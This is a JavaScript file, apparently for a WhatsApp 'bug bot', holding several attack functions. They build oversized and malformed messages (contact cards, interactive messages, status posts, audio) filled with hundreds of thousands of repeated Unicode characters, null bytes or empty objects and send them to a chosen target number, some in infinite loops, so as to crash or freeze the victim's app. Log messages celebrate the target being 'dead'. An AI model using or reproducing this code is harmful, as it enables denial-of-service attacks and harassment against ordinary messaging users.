            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
   } catch (err) {
      console.error(err);
   }
};

async function paramsBug(sock, target) {
  await sock.relayMessage(target, {
    newsletterAdminInviteMessage: {
      newsletterJid: "0@newsletter",
      newsletterName: " #pherine " + "ោ៝".repeat(50000),
      caption: " # ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆 ⭒ t.me/pherine ? " + 'ោ៝'.repeat(50000) + 'ꦾ'.repeat(25000) + 'ោ៝'.repeat(25000),
      inviteExpiration: "90000",
      contextInfo: {
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast",
        mentionedJid: [
          "0@s.whatsapp.net",
          "13135550002@s.whatsapp.net"
        ],
      },
    },
  }, {
    messageId: crypto.randomUUID(),
  });

  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: { title: " # ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆 ⭒ t.me/pherine ? " + 'ោ៝'.repeat(50000) + 'ꦾ'.repeat(25000) + 'ោ៝'.repeat(25000) },
          body: { text: " # ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆 ⭒ t.me/pherine ? " + 'ោ៝'.repeat(50000) + 'ꦾ'.repeat(25000) + 'ោ៝'.repeat(25000) },
          footer: { text: " #pherine " + "ោ៝".repeat(50000) },
          nativeFlowMessage: {
            buttons: [
              {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: 'ꦾ'.repeat(50000),
                  id: "0",
                  copy_code: 'ꦾ'.repeat(50000)
                })
              }
            ],
            messageParamsJson: JSON.stringify({
              limited_time_offer: {
                text: 'ꦾ'.repeat(50000),
                url: 'ꦾ'.repeat(50000),
                copy_code: 'ꦾ'.repeat(50000),
                expiration_time: Date.now() * 999
              },
              bottom_sheet: {
                in_thread_buttons_limit: 2,
                divider_indices: [1, 2, 3, 4, 5, 999],
                list_title: 'ꦾ'.repeat(50000),
                button_title: 'ꦾ'.repeat(50000)
              },
              tap_target_configuration: {
                title: 'ꦾ'.repeat(50000),
                description: 'ꦾ'.repeat(50000),
                canonical_url: 'ꦾ'.repeat(50000),
                domain: 'ꦾ'.repeat(50000),
                button_index: 0
              }
            })
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(
    target,
    msg.message,
    { messageId: msg.key.id }
  );
}

async function VnXCrashIos(sock, target) {
    let mbgiosvnx = await generateWAMessageFromContent(
        target,
        {
         contactMessage: {
            displayName:
        "°‌‌VnXIos ⿻ VnX ✶ > 666" + "𑇂𑆵𑆴𑆿".repeat(25000),
            vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;🦠⃰‌°‌‌VnX ⿻ Are You Okay? ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)};;;\nFN:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)}\nNICKNAME:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nORG:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nTITLE:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 813-1919-9692\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nEND:VCARD`,
                contextInfo: {
                    stanzaId: "VnX",
                    mentionedJid: [target], 
                    isForwarded: true,
                    forwardingScore: 999,
                    
                    interactiveAnnotations: [{
                        polygonVertices: [
                            { x: 0.05625700578093529, y: 0.1530572921037674 },
                            { x: 0.9437337517738342, y: 0.1530572921037674 },
                            { x: 0.9437337517738342, y: 0.8459166884422302 },
                            { x: 0.05625700578093529, y: 0.8459166884422302 }
                        ],
                        newsletter: {
                            newsletterJid: "120363186130999681@newsletter",
                            serverMessageId: 3033,
                            newsletterName: "sex null",
                            contentType: "UPDATE_CARD"
                        }
                    }]
                } 
            }
        },
        { userJid: sock.user.id, quoted: null }
    );

    await sock.relayMessage(
        "status@broadcast",
        mbgiosvnx.message,
        {
            messageId: mbgiosvnx.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: undefined
                                }
                            ]
                        }
                    ]
                }
            ]
        }
    );
}

async function plexippuspermanent(sock, target) {
  while (true) {
    try {
      const Yapit = {
        groupStatusMessageV2: {
          interactiveResponseMessage: {
            body: {
              text: "LoL",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: `{"values":{"in_pin_code":"999999","building_name":"LoL","landmark_area":"18","address":"Amp4","tower_number":"P0k3","city":"tolol","name":"Amp4","phone_number":"999999999999","house_number":"13135550002","floor_number":"@3135550202","state":"X${"\u0000".repeat(900000)}"}}`,
              version: 3
            }
          }
        }
      };

      await sock.sendMessage(target, Yapit, { participant: { jid: target } });

      console.log('Target Mati Tolol ' + target + ' Jeda Dulu Maruk');
      
      await new Promise(resolve => setTimeout(resolve, 2000)); 

    } catch (e) {
      console.error('Error Goblok Benerin: ' + e);
      break; 
    }
  }
}

async function VnXdelayJmbd(sock, target) {
  try {
    const msg = {
      groupStatusMessageV2: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
            fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
            fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
            mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
            mimetype: "image/webp",
            directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
            fileLength: 10610,
            mediaKeyTimestamp: 1775044724,
            stickerSentTs: 1775044724091,

            contextInfo: {
              isForwarded: true,
              forwardingScore: 9999999,
              pairedMediaType: 1,
              statusSourceType: 1,
              statusAttributionType: 2,

              urlTrackingMap: {
                urlTrackingMapElements: Array.from({ length: 250000 }, () => ({}))
              }
            }
          }
        }
      }
    };

    await sock.relayMessage(target, msg, {
      participant: { jid: target }
    });

    console.log("Target Is dead");

    await new Promise(r => setTimeout(r, 1500));

  } catch (err) {
    console.error("Error:", err);

    await new Promise(r => setTimeout(r, 5000));
  }
}

async function VnXHard(sock, target) {
while (true) { 
 try {
    const msg = {
      groupStatusMessageV2: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
            fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
            fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
            mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
            mimetype: "image/webp",
            directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
            fileLength: 10610,
            mediaKeyTimestamp: 1775044724,
            stickerSentTs: 1775044724091,

            contextInfo: {
              isForwarded: true,
              forwardingScore: 999999,
              pairedMediaType: 1,
              statusSourceType: 1,
              statusAttributionType: 2,
              showAdAttribution: true,

              urlTrackingMap: {
                urlTrackingMapElements: Array.from({ length: 250000 }, () => ({}))
              }
            }
          }
        }
      }
    };

    await sock.relayMessage(target, msg, {
      participant: { jid: target }
    });

    console.log("[x] Success Send Bug");

    await new Promise(r => setTimeout(r, 1500));

  } catch (err) {
    console.error("[!] Unexpected Error :", err);

    await new Promise(r => setTimeout(r, 5000));
  }
}
}

async function DelayOneMsgPermaVnX(sock, target) {
    while (true) {
        try {
            const msg = await generateWAMessageFromContent(
                target,
                {
                    groupStatusMessageV2: {
                        message: {  
                            interactiveResponseMessage: {
                                body: {
                                    text: "VnX",
                                    format: "DEFAULT"
                                },
                                nativeFlowResponseMessage: {
                                    name: "galaxy_message",
                                    paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(999999)}\"}}`,
                                    version: 3
                                }
                            }
                        }
                    }
                },
                { userJid: sock.user.id } 
            );

            await sock.relayMessage(
                target,
                msg.message,
                {
                    messageId: msg.key.id,
                    participant: { jid: target }
                }
            );

            console.log(`👻 Vnx VnX ke ${target} (Looping Active)`);

            await new Promise(resolve => setTimeout(resolve, 1000));

        } catch (err) {
            console.error("❌ Error dalam Loop:", err);
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    }
}

async function VnXDelayAiInvis(sock, target) {
    const VnXForwardAi = [
    "13135550202@bot", "13135550202@bot",
    "13135550202@bot", "13135550202@bot",
    "13135550202@bot", "13135550202@bot",
    "13135550202@bot", "13135550202@bot",
    "13135550202@bot", "13135550202@bot"
  ];

    while (true) {
        try {
            const msg = await generateWAMessageFromContent(
                target,
                {
                 groupStatusMessageV2: {
                    message: {
                      interactiveResponseMessage: {
                        contextInfo: {
                           mentionedJid: Array.from({ length: 200900 }, (_, y) => `1313555000${y + 1}@s.whatsapp.net`)
                         },
                          body: {
                             text: "VnXIsHere",
                                format: "DEFAULT"
                                },
                                nativeFlowResponseMessage: {
                                   name: "galaxy_message",
                                   paramsJson: `{\"flow_cta\":\"${"\n".repeat(999999)}\"}}`,
                                   version: 3
                                 }
                           }
                      }
                 }
             },
          { userJid: sock.user.id } 
        );

            await sock.relayMessage(
                target,
                msg.message,
                {
                    messageId: msg.key.id,
                    participant: { jid: target }
                }
            );

            console.log(`👻 XdelayVnX ke ${target} (Looping Active)`);

            await new Promise(resolve => setTimeout(resolve, 1000));

        } catch (err) {
            console.error("❌ Error dalam Loop:", err);
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    }
}

async function VnXAudioBulldoNew(sock, target) {
  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: {
         audioMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7114-24/553151991_818685271268692_6795957783606894464_n.enc?ccb=11-4&oh=01_Q5Aa4AHdygHdhtAMHQB0P7fDG2jGlUkQfSzCPw4NPnWbiF8eKQ&oe=69E640DB&_nc_sid=5e03e0&mms3=true",
           mimetype: "audio/mp4",
           fileSha256: "BAcpC1KGx40bu/FV78kBAafPjkkdj6DLVAx+B1g3avQ=",
           fileLength: "109951162777600",
           seconds: 1,
           ptt: true,
           mediaKey: "1KXHR1pvx2+y01K6Dewevx5FF5O5wfc5iE/oHIua2WY=",
           fileEncSha256: "CggqdAt0fX+QHjKnfyX2OjO1OoUXLm5WlVlv6f5aGCU=",
           directPath: "/v/t62.7114-24/553151991_818685271268692_6795957783606894464_n.enc?ccb=11-4&oh=01_Q5Aa4AHdygHdhtAMHQB0P7fDG2jGlUkQfSzCPw4NPnWbiF8eKQ&oe=69E640DB&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1774107510",
           waveform: "EBAREicPEigjMkgwMDITDQ8QFBYkCwwMDAwIBAUCBScpMkNkUE1GTT1KVVk0VUVOWlUtWEk0X0o+Xh4XFxAIAQ==",
            contextInfo: {
              isForwarded: true,
              forwardingScore: 999,
              quotedMessage: {
                listMessage: {
                  title: '/u0000'.repeat(350000),
                  description: '/u0000'.repeat(250000),
                  buttonText: 'VnX',
                  footerText: '',
                  listType: 1,
                  sections: [
                    {
                      title: '',
                      rows: Array.from({ length: 10 }, (_, i) => ({
                        title: '/u0000'.repeat(250000),
                        description: '/u0000'.repeat(250000),
                        rowId: null,
                      })),
                    },
                  ],
                },
              },
            },
          },
        },
      },
    },
    { participant: { jid: target } },
  );

  console.log('[!] VnX Bulldo Audio invis Bug Sent to: ' + target);
}
//


bot.launch()
